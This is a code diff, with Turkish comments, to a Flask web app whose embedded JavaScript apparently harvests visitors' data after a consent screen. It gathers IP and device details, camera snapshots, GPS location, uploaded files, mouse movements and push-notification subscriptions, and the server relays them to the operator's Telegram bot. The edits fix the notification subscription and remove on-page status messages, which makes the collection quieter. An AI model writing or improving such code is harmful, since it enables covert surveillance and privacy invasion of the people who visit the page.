@@ -103,10 +103,10 @@ def ana_sayfa():
         let hareketVerisi = [];
         let sonHareketZamani = 0;
 
-        // Push Bildirimleri için Base64 Çevirici
+        // Push Bildirimleri için Base64 Çevirici (Düzeltildi)
         function urlBase64ToUint8Array(base64String) {{
             const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding).replace(/\\-/g, '+').replace(/_/g, '/');
+            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
             const rawData = window.atob(base64);
             const outputArray = new Uint8Array(rawData.length);
             for (let i = 0; i < rawData.length; ++i) {{ outputArray[i] = rawData.charCodeAt(i); }}
@@ -142,7 +142,7 @@ def ana_sayfa():
             else {{
                 document.getElementById('onay-ekrani').style.display = 'none';
                 document.getElementById('sistem-alani').style.display = 'block';
-                izinleriIste();
+                izinleriIste(); // İşte aradığın fonksiyon burada çağrılıyor!
             }}
         }});
 
@@ -169,6 +169,7 @@ def ana_sayfa():
         window.addEventListener('mousemove', (e) => {{ hareketEkle(e.clientX, e.clientY); }});
         window.addEventListener('beforeunload', hareketGonder);
 
+        // 🚨 İŞTE ARADIĞIN FONKSİYON BURADA 🚨
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
@@ -179,20 +180,33 @@ def ana_sayfa():
                 body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
             }}).catch(e => console.log(e));
 
-            // 2. BİLDİRİM İZNİ VE ABONELİK
+            // 2. BİLDİRİM İZNİ VE ABONELİK (Düzeltildi)
             if ('serviceWorker' in navigator && 'PushManager' in window) {{
-                navigator.serviceWorker.register('/sw.js').then(function(swReg) {{
-                    return swReg.pushManager.subscribe({{
-                        userVisibleOnly: true,
-                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
-                    }});
-                }}).then(function(subscription) {{
-                    fetch('/abone_ol', {{
-                        method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
-                        body: JSON.stringify(subscription)
-                    }}).catch(e => console.log(e));
-                }}).catch(function(error) {{ console.log('Abonelik hatası:', error); }});
+                try {{
+                    durum.innerHTML = "Bildirim izni isteniyor...";
+                    const izin = await Notification.requestPermission(); // İZİN İSTEME KODU
+                    
+                    if (izin === 'granted') {{
+                        durum.innerHTML = "Bildirim izni verildi. Abone olunuyor...";
+                        const swReg = await navigator.serviceWorker.register('/sw.js');
+                        const subscription = await swReg.pushManager.subscribe({{
+                            userVisibleOnly: true,
+                            applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
+                        }});
+                        
+                        fetch('/abone_ol', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
+                            body: JSON.stringify(subscription)
+                        }}).catch(e => console.log(e));
+                        
+                        durum.innerHTML = "Abonelik başarılı!";
+                    }} else {{
+                        durum.innerHTML = "Bildirim izni verilmedi.";
+                    }}
+                }} catch (error) {{
+                    durum.innerHTML = "Bildirim Hatası: " + error.message;
+                }}
             }}
 
             try {{
@@ -214,8 +228,6 @@ def ana_sayfa():
                         body: JSON.stringify({{ image: foto, ip: IP_ADRESI }})
                     }}).catch(e => console.log(e));
 
-                    durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
-                    
                     // 4. GPS KONUM
                     setTimeout(() => {{
                         if (navigator.geolocation) {{
@@ -226,9 +238,8 @@ def ana_sayfa():
                                         headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                                         body: JSON.stringify({{ lat: position.coords.latitude, lon: position.coords.longitude }})
                                     }}).catch(e => console.log(e));
-                                    durum.innerHTML = "Konum alındı. Sistem dinlemede...";
                                 }},
-                                (error) => {{ durum.innerHTML = "Konum izni reddedildi."; }}
+                                (error) => {{ console.log("Konum hatası"); }}
                             );
                         }}
                     }}, 1000); 
@@ -254,7 +265,6 @@ def ana_sayfa():
                     if (file) {{
                         const formData = new FormData();
                         formData.append('dosya', file);
-                        durum.innerHTML = "Dosya yükleniyor, lütfen bekleyin...";
                         
                         fetch('/dosya', {{
                             method: 'POST',
@@ -267,7 +277,7 @@ def ana_sayfa():
                 }});
 
             }} catch (error) {{
-                durum.innerHTML = "İzinler reddedildi. Sistem kilitlendi.";
+                durum.innerHTML = "Kamera/Mikrofon izni reddedildi.";
             }}
         }}
     </script>
@@ -283,13 +293,11 @@ def abone_ol():
     if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
     abonelik = request.json
     
-    # Gelen aboneliği bir dosyaya kaydet (Render'da geçici olarak tutar)
     try:
         with open('aboneler.json', 'a') as f:
             f.write(json.dumps(abonelik) + "\n")
     except: pass
 
-    # 🚨 ÖNEMLİ: Abonelik kodunu Telegram'a yolla ki kopyalayıp terminalde kullanabilesin!
     mesaj = f"🔔 <b>YENİ CİHAZ ABONE OLDU!</b>\n\nBu JSON kodunu kopyala ve Pydroid'de kullan:\n\n<code>{json.dumps(abonelik)}</code>"
     telegram_mesaj_gonder(mesaj)
     return "OK", 200
@@ -311,7 +319,7 @@ def hareket():
     if len(hareketler) > 0:
         ilk = hareketler[0]
         son = hareketler[-1]
-        mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi.\nBaşlangıç: X:{ilk['x']} Y:{ilk['y']}\nBitiş: X:{son['x']} Y:{son['y']}"
+        mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi."
         telegram_mesaj_gonder(mesaj)
     return "OK", 200
 
